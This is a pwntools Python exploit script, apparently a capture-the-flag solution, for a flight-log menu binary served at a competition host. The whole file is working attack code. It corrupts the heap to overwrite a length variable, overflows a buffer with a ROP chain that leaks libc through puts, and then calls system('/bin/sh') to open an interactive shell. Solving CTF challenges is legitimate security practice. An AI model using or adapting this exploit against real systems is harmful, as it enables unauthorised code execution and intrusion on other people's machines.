#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chal.competitivecyber.club"
PORT = 8885

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p,size,value,yesorno):
    ru(p,b">>")
    sl(p,b"2")
    ru(p,b"flightlog >> ")
    sl(p,b"%i" % size)
    ru(p,b"flightscript >> ")
    sl(p,value)
    ru(p,b"(y/n) >>")
    sl(p,yesorno)

def edit(p,index,value):
    ru(p,b">>")
    sl(p,b"3")
    ru(p,b"index >>")
    sl(p,"%i" % index)
    ru(p,b"(8) >>")
    sl(p,value)

def delete(p, index):
    ru(p, b">>")
    sl(p, b"4")
    ru(p, b"index >>")
    sl(p,"%i" % index)

def exit_prog(p):
    ru(p,b">>")
    sl(p,b"5")

def create_flightlog(p,value):
    ru(p,b">>")
    sl(p, b"1")
    ru(p,b"flightlog >>")
    sl(p,value)




def exploit(p,e,r,l):

    create(p,0x428,b"A",b"no")
    create(p,0x18,b"G",b"no") # Guard Chunk

    create(p,0x418,b"B",b"no") 
    create(p,0x18,b"G",b"no")

    delete(p,0)
    create(p,0x438,b"C",b"no")
    delete(p,2)

    edit(p,0,p64(e.sym["loglen"] - 0x20))

    create(p,0x458,b"D",b"no")

    
    pop_rdi = r.find_gadget(["pop rdi", "ret"])[0]

    pad = b"A" * 280
    chain = p64(pop_rdi)
    chain += p64(e.got["puts"]) + p64(e.plt["puts"])
    chain += p64(e.sym["main"])
    
    create_flightlog(p,pad+chain)
    exit_prog(p)

    ru(p,b"Have a nice day!")
    rl(p)
    l.address = u64(p.recv(6).ljust(8,b"\x00")) - l.sym["puts"]
    log.info(f"Leaked libc base {hex(l.address)}")

    chain = p64(pop_rdi+1) + p64(pop_rdi) + p64(next(l.search(b"/bin/sh\x00")))
    chain += p64(l.sym["system"])

    create_flightlog(p,pad+chain)
    exit_prog(p)

 
    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)
    
    l = ELF("./libc.so.6")
    exploit(p,e,r,l)
